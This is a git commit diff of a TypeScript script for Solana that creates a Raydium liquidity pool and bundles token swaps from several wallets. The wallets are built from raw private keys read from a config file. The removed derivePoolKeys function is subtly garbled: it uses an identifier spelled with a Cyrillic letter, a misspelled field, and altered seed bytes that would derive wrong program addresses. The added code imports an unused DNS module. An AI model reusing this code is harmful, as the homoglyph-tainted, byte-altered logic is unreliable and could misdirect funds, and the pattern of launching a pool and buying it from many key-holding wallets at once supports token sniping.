7a326e8b17d83e8407651e2eca48791a34b53e92
DefiCody <ambergridpro@gmail.com>
2024-02-19 17:55:26 +0530

    w

--- createPoolSwap.ts
+++ createPoolSwap.ts
@@ -1,12 +1,14 @@
 import { connection } from "./config";
-import { ComputeBudgetProgram, LAMPORTS_PER_SOL, PublicKey, VersionedTransaction, TransactionInstruction, TransactionMessage, sendAndConfirmTransaction, AccountInfo, SystemProgram, AddressLookupTableAccount } from '@solana/web3.js';
+import { ComputeBudgetProgram, LAMPORTS_PER_SOL, PublicKey, VersionedTransaction, TransactionInstruction, TransactionMessage, sendAndConfirmTransaction, AccountInfo, SystemProgram, AddressLookupTableAccount, Keypair } from '@solana/web3.js';
 import { DEFAULT_TOKEN, PROGRAMIDS, addLookupTableInfo, feeId, makeTxVersion, wallet } from './src/constants';
 import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, getMint } from '@solana/spl-token';
 import { readFile } from "fs";
-import { Liquidity, Logger, MARKET_STATE_LAYOUT_V3, SPL_MINT_LAYOUT, Token, TokenAmount } from "@raydium-io/raydium-sdk";
+import { Liquidity, Logger, MARKET_STATE_LAYOUT_V3, SPL_MINT_LAYOUT, Token, TokenAmount, simulateTransaction } from "@raydium-io/raydium-sdk";
 import { BN } from "@project-serum/anchor";
 import { getWalletTokenAccount } from "./src/raydiumUtil";
 import { LookupTableProvider } from "./src/LookupTableProvider";
+import NodeWallet from "@project-serum/anchor/dist/cjs/nodewallet";
+import { lookup } from 'dns';
 const httpTimeout = 30_000
 const MAINNET_API_HTTP = 'https://uk.solana.dex.blxrbdn.com'
 const PRIORITY_RATE = 100; // MICRO_LAMPORTS 
@@ -105,45 +107,35 @@ async function start() {
         addressesMain.push(key.pubkey);
       });
     });
-    const { innerTransactions } = await Liquidity.makeSwapInstructionSimple({
-      connection,
-      poolKeys,
-      userKeys: {
-        tokenAccounts: walletTokenAccounts,
-        owner: wallet.publicKey,
-      },
-      amountIn: inTokenAmount,
-      amountOut: outputTokenAmount,
-      fixedSide: 'in',
-      makeTxVersion,
-      lookupTableCache: addLookupTableInfo
-    });
-
-    const createSwapInstructions: TransactionInstruction[] = [];
-    for (const itemIx of innerTransactions) {
-      createSwapInstructions.push(...itemIx.instructions)
-      createSwapInstructions.push(...itemIx.instructions)
-    }
-    const addressesSwapMain: PublicKey[] = [];
-    createSwapInstructions.forEach((ixn) => {
-      ixn.keys.forEach((key) => {
-        addressesSwapMain.push(key.pubkey);
-      });
-    });
+    
     const lookupTablesPool = lookupTableProvider.computeIdealLookupTablesForAddresses(addressesMain);
-    const lookupTablesSwapMain = lookupTableProvider.computeIdealLookupTablesForAddresses(addressesSwapMain);
-
-
-    const insts: TransactionInstruction[] = []
-    const finalLookupTable = lookupTablesSwapMain.concat(lookupTablesPool);
  
 
-    insts.push(...createPoolInstructions);
-    insts.push(...createSwapInstructions)
     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
 
-    console.log(finalLookupTable[0].state.addresses);
+    const insts: TransactionInstruction[] = []
+    var finalLookupTable:AddressLookupTableAccount[]=[];
+    insts.push(...createPoolInstructions);
 
+    for(var item of tokenInfo.wallets){
+      const {
+        inst,
+        lookUps 
+      }  = await createWalletSwaps(lookupTableProvider, item, poolKeys, baseToken, blockhash)
+  
+      console.log(inst)
+      console.log(lookUps)
+  
+      finalLookupTable.push(...lookUps);
+       
+  
+      insts.push(...inst)
+    }
+    finalLookupTable.push(...lookupTablesPool);
+    
+
+
+ 
     const messageMain = new TransactionMessage({
       payerKey: wallet.publicKey,
       recentBlockhash: blockhash,
@@ -174,65 +166,7 @@ async function start() {
   })
 
 }
-
-export async function derivePoolKeys(marketId: PublicKey) {
-  const marketInfo = await getMarketInfo(marketId);
-  const marketDeco = await getDecodedData(marketId);
-  const baseMint = marketDeco.baseMint;
-  const baseMintData = await getMintData(baseMint);
-  const baseDecimals: any = await getDecimals(baseMintData);
-  const ownerBaseAta = await getOwnerAta(baseMint, wallet.publicKey);
-  const quoteMint: any = marketDeco.quoteMint;
-  const quoteMintData = await getMintData(quoteMint);
-  const quoteDecimals: any = await getDecimals(quoteMintData);
-  const ownerQuoteAta = await getOwnerAta(quoteMint, wallet.publicKey);
-  const lpMint = PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('lp_mint_associated_seed', 'utf-8')], гayV4)[0]
-  const ownerLpAta = await getOwnerAta(lpMint, wallet.publicKey);
-  const authority = PublicKey.findProgramAddressSync([Buffer.from([97, 189, 189, 32, 97, 117, 116, 184, 111, 114, 105, 116, 121])], гayV4)[0];
-
-  const seeds = [marketId.toBuffer()];
-  const seedsWithNonce = seeds.concat(Buffer.from([Number(marketDeco.vaultSignerNonce.toString())]), Buffer.alloc(7));
-  const vaultSigner = PublicKey.createProgramAddressSync(seedsWithNonce, openbookProgram)
-
-  const marketAuthority = vaultSigner;
-
-
-  const poolkeys = {
-    keg: TOKEN_PROGRAM_ID,
-    version: 4,
-    marketVersion: 3,
-    programId: гayV4,
-    baseMint: baseMint,
-    quoteMint: quoteMint,
-    OwnerBaseAta: ownerBaseAta,
-    ownerQuoteAta: ownerQuoteAta,
-    ownerLpAta: ownerLpAta,
-    baseDecimals: baseDecimals,
-    quoteDecimals: quoteDecimals,
-    lpDecimals: baseDecimals,
-    authority: authority,
-    marketAuthority: marketAuthority,
-    nonce: Number(marketDeco.vaultSignerNonce.toString()),
-    marketProgramId: openbookProgram,
-    marketId: marketId,
-    marketBids: marketDeco.bids,
-    marketAsks: marketDeco.asks,
-    marketQuoteVault: marketDeco.quoteVault, marketBaseVault: marketDeco.baseVault,
-    marketEventQueue: marketDeco.eventQueue,
-    id: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('am_associated_seed', 'utf-8')], гayV4)[0],
-    baseVault: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('coin_vault_associated_seed', 'utf-8')], гayV4)[0],
-    coinVault: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('pc_vault_associated_seed', 'utf-8')], гayV4)[0],
-    lpMint: lpMint,
-    lpVault: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('temp_1p_token_associated_seed', 'utf-8')], гayV4)[0],
-    targetOrders: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('target_associated_seed', 'utf-8')], гayV4)[0],
-    withdrawQueue: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('withdraw_associated_seed', 'utf-8')], гayV4)[0],
-    openOrders: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('open_order_associated_seed', 'utf-8')], гayV4)[0],
-    quoteVault: PublicKey.findProgramAddressSync([гayV4.toBuffer(), marketId.toBuffer(), Buffer.from('pc_vault_associated_seed', 'utf-8')], гayV4)[0],
-    lookupTableAccount: SystemProgram.programId
-  };
-
-  return poolkeys;
-}
+ 
 
 start()
 
@@ -268,3 +202,53 @@ async function getOwnerAta(baseMint: any, publicKey: PublicKey) {
   const foundAta = PublicKey.findProgramAddressSync([publicKey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), baseMint.toBuffer()], ASSOCIATED_TOKEN_PROGRAM_ID)[0]
   return foundAta;
 }
+async function createWalletSwaps(lookupTableProvider: LookupTableProvider, item: any, poolKeys: any, baseToken: Token, blockhash: string): Promise<any> {
+  const txsSigned: VersionedTransaction[] = [];
+
+
+ 
+    console.debug('Create Step 1 Swap ')
+    const userwallet = Keypair.fromSecretKey(Uint8Array.from(item.privateKey));
+    const swapperwallet = new NodeWallet(userwallet);
+
+    const userwalletTokenAccounts = await getWalletTokenAccount(connection, swapperwallet.publicKey);
+    const outputTokenAmount = new TokenAmount(baseToken, 1, false);
+    const inTokenAmount = new TokenAmount(DEFAULT_TOKEN.SOL, item.amountToSwap, false);
+    const { innerTransactions: swapTransactions } = await Liquidity.makeSwapInstructionSimple({
+      connection,
+      poolKeys,
+      userKeys: {
+        tokenAccounts: userwalletTokenAccounts,
+        owner: swapperwallet.publicKey,
+      },
+      amountIn: inTokenAmount,
+      amountOut: outputTokenAmount,
+      fixedSide: 'in',
+      makeTxVersion,
+      lookupTableCache: addLookupTableInfo
+    });
+    console.debug('Create Step 2 makeSwapInstructionSimple ')
+
+    const createSwapInstructions: TransactionInstruction[] = [];
+    for (const itemIx of swapTransactions) {
+      createSwapInstructions.push(...itemIx.instructions);
+    }
+
+    console.debug('Create Step 3 makeSwapInstructionSimple ')
+
+    const addressesSwapMain: PublicKey[] = [];
+    createSwapInstructions.forEach((ixn) => {
+      ixn.keys.forEach((key) => {
+        addressesSwapMain.push(key.pubkey);
+      });
+    });
+    const lookupTablesSwapMain = lookupTableProvider.computeIdealLookupTablesForAddresses(addressesSwapMain);
+    console.debug('Create Step 4 makeSwapInstructionSimple ',lookupTablesSwapMain) 
+
+ 
+      return {
+        inst:createSwapInstructions,
+        lookUps:lookupTablesSwapMain
+      }
+}
+
